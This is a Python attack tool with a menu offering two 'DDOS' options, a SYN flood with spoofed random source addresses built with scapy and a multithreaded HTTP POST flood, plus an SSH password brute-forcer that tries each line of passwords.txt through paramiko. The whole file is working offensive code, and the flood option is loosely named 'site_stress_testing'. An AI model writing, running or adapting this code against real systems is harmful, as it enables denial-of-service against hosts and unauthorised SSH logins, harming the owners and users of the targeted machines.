from scapy.all import *
import sys
import random
import socket
import concurrent.futures
import paramiko

conf.L3socket = conf.L3socket or L3RawSocket()

def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def randInt():
    x = random.randint(1000, 9000)
    return x

def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    print("Packets are sending ...")
    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP(dst=dstIP, src=randomIP(), version=4)
        TCP_Packet = TCP(sport=s_port, dport=dstPort, flags="S", seq=s_eq, window=w_indow)

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1

    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def send_request(thread_id):
    host = input("Enter destination IP: ")
    port = 80
    data = f"key1=value1&key2=value2&thread_id={thread_id}"
    content_length = len(data)

    request = f"POST / HTTP/1.1\r\n" \
              f"Host: {host}\r\n" \
              "Content-Type: application/x-www-form-urlencoded\r\n" \
              f"Content-Length: {content_length}\r\n" \
              "\r\n" \
              f"{data}"

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(request.encode())
        response = s.recv(4096)

def site_stress_testing():
    print("Choose DDOS attack type:")
    print("1. SYN Flood")
    print("2. HTTP POST Flood")

    choice = input("Enter the number of the option you want to choose (1/2): ")

    if choice == '1':
        dstIP = input("Enter the target IP for SYN Flood: ")
        dstPort = 80
        counter = 10000
        SYN_Flood(dstIP, dstPort, counter)
    elif choice == '2':
        num_threads = int(input("Enter the number of threads for HTTP POST Flood: "))
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(send_request, i) for i in range(num_threads)]
            concurrent.futures.wait(futures)
    else:
        print("Invalid choice. Exiting.")

def check_ssh_password(hostname, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        client.connect(hostname, port=port, username=username, password=password)

        print(f"Success: Password {password} is correct for {username}@{hostname}:{port}")
        return True

    except paramiko.AuthenticationException:
        return False

    except Exception as e:
        print(f"Error: {e}")
        return False

    finally:
        client.close()

def brute_force():
    print("Executing SSH Brute Force...")
    hostname = input("Enter the target SSH server IP: ")
    port = 22
    username = input("Enter the SSH username: ")
    print("# attack has been started")
    try:
        with open("passwords.txt", "r") as file:
            passwords_list = file.read().splitlines()
    except FileNotFoundError:
        print("Error: Passwords file (passwords.txt) not found.")
        return

    password_found = False

    for password in passwords_list:
        if check_ssh_password(hostname, port, username, password):
            password_found = True
            break

    if password_found:
        print("Password Found!")
    else:
        print("Password not found.")

def main():
    print("Choose an option:")
    print("1. DDOS")
    print("2. Brute Force")

    choice = input("Enter the number of the option you want to choose (1/2): ")

    if choice == '1':
        site_stress_testing()
    elif choice == '2':
        brute_force()
    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
